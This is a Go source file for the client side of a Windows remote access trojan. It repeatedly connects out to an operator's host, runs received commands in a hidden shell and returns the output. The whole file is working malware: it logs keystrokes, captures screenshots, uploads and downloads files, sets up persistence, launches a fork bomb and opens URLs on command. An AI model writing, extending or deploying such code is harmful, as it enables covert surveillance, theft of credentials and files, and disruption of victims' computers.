package work

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"generate/pool/osinfo"
	"generate/pool/persistence"
	"golang.org/x/sys/windows/registry"
	"image/png"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"syscall"
	"time"

	screenshot "github.com/kbinani/screenshot"
)


var (
	FileName	string
	FOLDER_PATH        = "\\ProgramData"
	NEW_LINE    string = "\n"
)

var (

)

var (
	dll, _              = syscall.LoadDLL("user32.dll")
	GetAsyncKeyState, _ = dll.FindProc("GetAsyncKeyState")
	GetKeyState, _      = dll.FindProc("GetKeyState")
	Logs                string
)

func Generate(remoteAddr,remotePort,fileName string) {
	FileName = fileName
	RemoteAddr = remoteAddr
	RemotePort = remotePort
	for {
		time.Sleep(1*time.Second)
		Connect()
	}
}

var RemoteAddr , RemotePort string

func Connect() {
	// Create a connection
	conn, err := net.Dial("tcp", RemoteAddr+":"+RemotePort)

	// If don't exist a connection created than try connect to a new
	if err != nil {
		log.Println("[*] Connecting...")
		for {
			time.Sleep(1*time.Second)
			Connect()
		}
	}

	for {
		// When the command received aren't encoded,
		// skip switch, and be executed on OS shell.
		command, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil{
			conn.Close()
			Connect()
		}

		// When the command received are encoded,
		// decode message received, and test on switch
		decodedCommand, _ := base64.StdEncoding.DecodeString(command)
		log.Println(decodedCommand)

		switch string(decodedCommand) {
		default:
			fmt.Println(string(decodedCommand))
			SendMessage(conn, EncodeBytesToString(RunCmdReturnByte(string(decodedCommand))))
			//RemoveNewLineCharFromConnection(conn)

		case "back":
			conn.Close()
			Connect()

		case "exit":
			conn.Close()
			os.Exit(0)

		case "screenshot":
			SendMessage(conn, EncodeBytesToString(TakeScreenShot()))
			//RemoveNewLineCharFromConnection(conn)

		case "keylogger_start":
			go Keylogger() // Run a go routine for Keylogger function
			SendMessage(conn, " [i] Keylogger Listening!")
			RemoveNewLineCharFromConnection(conn)

		case "keylogger_show":
			SendMessage(conn, Logs)
			RemoveNewLineCharFromConnection(conn)

		case "download":
			pathDownload := ReceiveMessageStdEncoding(conn)
			fmt.Println(pathDownload)
			file, err := ioutil.ReadFile(string(pathDownload))
			if err != nil {
				conn.Write([]byte("[!] File not found!" + "\n"))
			}

			SendMessage(conn, EncodeBytesToString(file))
			RemoveNewLineCharFromConnection(conn)

		case "upload":
			uploadInput := ReceiveMessageStdEncoding(conn)
			decUpload := ReceiveMessageURLEncoding(conn)
			if string(decUpload) != "" {
				ioutil.WriteFile(string(uploadInput), []byte(decUpload), 777)
			}

		case "getos":
			SendMessage(conn, string(osinfo.GetOSInformation()))
			RemoveNewLineCharFromConnection(conn)

		case "lockscreen":
			log.Println(RunCmdReturnByte("rundll32.exe user32.dll,LockWorkStation"))
			SendMessage(conn, "[i] Locked!")
			RemoveNewLineCharFromConnection(conn)

		case "persistence_enable":
			// Create a folder to save file
			self := &persistence.Persistence{}
			Personal,_:= getPersonal()
			self.Setfilename(FileName)
			self.SetfolderPath(Personal,"\\windows")
			err := self.Enable()
			if err == nil {
				SendMessage(conn, "[*] Persistence Enabled!")
			} else if os.IsNotExist(err) {
				SendMessage(conn, "[!] Persistence Failed!")
			}

			RemoveNewLineCharFromConnection(conn)

		case "persistence_disable":
			// Remove directory
			self := &persistence.Persistence{}
			Personal,_:= getPersonal()
			self.Setfilename(FileName)
			self.SetfolderPath(Personal,"\\windows")
			self.Disable()

			SendMessage(conn, "[*] Persistence Disabled!")
			RemoveNewLineCharFromConnection(conn)

		case "bomb":
			// Create a file to run fork bomb
			CreateFile(os.Getenv("systemdrive")+FOLDER_PATH+"\\bomb.bat", "%0|%0")

			// Run file
			RunCmd(os.Getenv("systemdrive") + FOLDER_PATH + "\\bomb.bat && del " + os.Getenv("systemdrive") + FOLDER_PATH + "\\bomb.bat")

			SendMessage(conn, "[*] Executed Fork Bomb!")
			RemoveNewLineCharFromConnection(conn)

		case "openurl":
			// Receive url and run it
			url := ReceiveMessageStdEncoding(conn)
			RunCmd("start " + url)

			SendMessage(conn, "[*] Opened!")
			RemoveNewLineCharFromConnection(conn)
		} // end switch
	}
}

func getPersonal() (string, error) {
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`, registry.ALL_ACCESS)

	if err != nil {
		return "", err
	}
	defer k.Close()

	s, _, err := k.GetStringValue("Personal")
	if err != nil {
		return "", err
	}
	return s, nil
}


func SendMessage(conn net.Conn, message string) {
	conn.Write([]byte(base64.URLEncoding.EncodeToString([]byte(message)) + NEW_LINE))
}

func ReceiveMessageStdEncoding(conn net.Conn) string {
	message, _ := bufio.NewReader(conn).ReadString('\n')
	messageDecoded, _ := base64.StdEncoding.DecodeString(message)
	return string(messageDecoded)
}

func ReceiveMessageURLEncoding(conn net.Conn) string {
	message, _ := bufio.NewReader(conn).ReadString('\n')
	messageDecoded, _ := base64.URLEncoding.DecodeString(message)
	return string(messageDecoded)
}

func EncodeBytesToString(value []byte) string {
	return base64.URLEncoding.EncodeToString(value)
}

func RemoveNewLineCharFromConnection(conn net.Conn) {
	newLineChar, _ := bufio.NewReader(conn).ReadString('\n')
	log.Println(newLineChar)
}

func RunCmdReturnByte(cmd string) []byte {
	cmdExec := exec.Command("cmd", "/C", cmd)

	cmdExec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	c, err := cmdExec.Output()
	cmdExec.Stderr = os.Stderr
	if err != nil {
		return []byte(err.Error())
	}
	return c
}

func RunCmdReturnString(cmd string) string {
	cmdExec := exec.Command("cmd", "/C", cmd)
	cmdExec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	c, _ := cmdExec.Output()
	return string(c)
}

func RunCmd(cmd string) {
	cmdExec := exec.Command("cmd", "/C", cmd)
	cmdExec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	c, _ := cmdExec.Output()
	log.Println(c)
}

func CreateFile(path string, text string) {
	create, _ := os.Create(path)
	create.WriteString(text)
	create.Close()
}

func TakeScreenShot() []byte {
	// Create a path to save screenshto
	pathToSaveScreenshot := os.Getenv("systemdrive") + FOLDER_PATH + "\\screenshot.png"

	// Run func to get screenshot
	n := screenshot.NumActiveDisplays()

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			Connect()
		}
		file, _ := os.Create(pathToSaveScreenshot)
		defer file.Close()
		png.Encode(file, img)
	}
	// end func to get screenshot

	// Read screenshot file
	file, err := ioutil.ReadFile(pathToSaveScreenshot)
	if err != nil {
		return nil
	}
	return file
}

// It is just a poor implementation of a keylogger written in golang
func Keylogger() {
	for {

		time.Sleep(1 * time.Millisecond)

		for i := 0; i < 256; i++ {
			Result, _, _ := GetAsyncKeyState.Call(uintptr(i))

			if Result&0x1 == 0 {
				continue
			}

			switch i {
			case 8:
				Logs += "[Backspace]"
			case 9:
				Logs += "[Tab]"
			case 13:
				Logs += "[Enter]"
			case 16:
				Logs += "[Shift]"
			case 17:
				Logs += "[Control]"
			case 18:
				Logs += "[Alt]"
			case 19:
				Logs += "[Pause]"
			case 27:
				Logs += "[Esc]"
			case 32:
				Logs += " "
			case 33:
				Logs += "[PageUp]"
			case 34:
				Logs += "[PageDown]"
			case 35:
				Logs += "[End]"
			case 36:
				Logs += "[Home]"
			case 37:
				Logs += "[Left]"
			case 38:
				Logs += "[Up]"
			case 39:
				Logs += "[Right]"
			case 40:
				Logs += "[Down]"
			case 44:
				Logs += "[PrintScreen]"
			case 45:
				Logs += "[Insert]"
			case 46:
				Logs += "[Delete]"
			case 48:
				Logs += "[0)]"
			case 49:
				Logs += "[1!]"
			case 50:
				Logs += "[2@]"
			case 51:
				Logs += "[3#]"
			case 52:
				Logs += "[4$]"
			case 53:
				Logs += "[5%]"
			case 54:
				Logs += "[6¨]"
			case 55:
				Logs += "[7&]"
			case 56:
				Logs += "[8*]"
			case 57:
				Logs += "[9(]"
			case 65:
				Logs += "A"
			case 66:
				Logs += "B"
			case 67:
				Logs += "C"
			case 186:
				Logs += "Ç"
			case 68:
				Logs += "D"
			case 69:
				Logs += "E"
			case 70:
				Logs += "F"
			case 71:
				Logs += "G"
			case 72:
				Logs += "H"
			case 73:
				Logs += "I"
			case 74:
				Logs += "J"
			case 75:
				Logs += "K"
			case 76:
				Logs += "L"
			case 77:
				Logs += "M"
			case 78:
				Logs += "N"
			case 79:
				Logs += "O"
			case 80:
				Logs += "P"
			case 81:
				Logs += "Q"
			case 82:
				Logs += "R"
			case 83:
				Logs += "S"
			case 84:
				Logs += "T"
			case 85:
				Logs += "U"
			case 86:
				Logs += "V"
			case 87:
				Logs += "W"
			case 88:
				Logs += "X"
			case 89:
				Logs += "Y"
			case 90:
				Logs += "Z"
			case 96:
				Logs += "0"
			case 97:
				Logs += "1"
			case 98:
				Logs += "2"
			case 99:
				Logs += "3"
			case 100:
				Logs += "4"
			case 101:
				Logs += "5"
			case 102:
				Logs += "6"
			case 103:
				Logs += "7"
			case 104:
				Logs += "8"
			case 105:
				Logs += "9"
			case 106:
				Logs += "*"
			case 107:
				Logs += "+"
			case 109:
				Logs += "-"
			case 110:
				Logs += ","
			case 111:
				Logs += "/"
			case 112:
				Logs += "[F1]"
			case 113:
				Logs += "[F2]"
			case 114:
				Logs += "[F3]"
			case 115:
				Logs += "[F4]"
			case 116:
				Logs += "[F5]"
			case 117:
				Logs += "[F6]"
			case 118:
				Logs += "[F7]"
			case 119:
				Logs += "[F8]"
			case 120:
				Logs += "[F9]"
			case 121:
				Logs += "[F10]"
			case 122:
				Logs += "[F11]"
			case 123:
				Logs += "[F12]"
			case 91:
				Logs += "[Super]"
			case 93:
				Logs += "[Menu]"
			case 144:
				Logs += "[NumLock]"
			case 189:
				Logs += "[-_]"
			case 187:
				Logs += "[=+]"
			case 188:
				Logs += "[,<]"
			case 190:
				Logs += "[.>]"
			case 191:
				Logs += "[;:]"
			case 192:
				Logs += "['\"]"
			case 193:
				Logs += "[/?]"
			case 221:
				Logs += "[[{]"
			case 220:
				Logs += "[]}]"
			case 226:
				Logs += "[\\|]"
			}
		}
	}
}


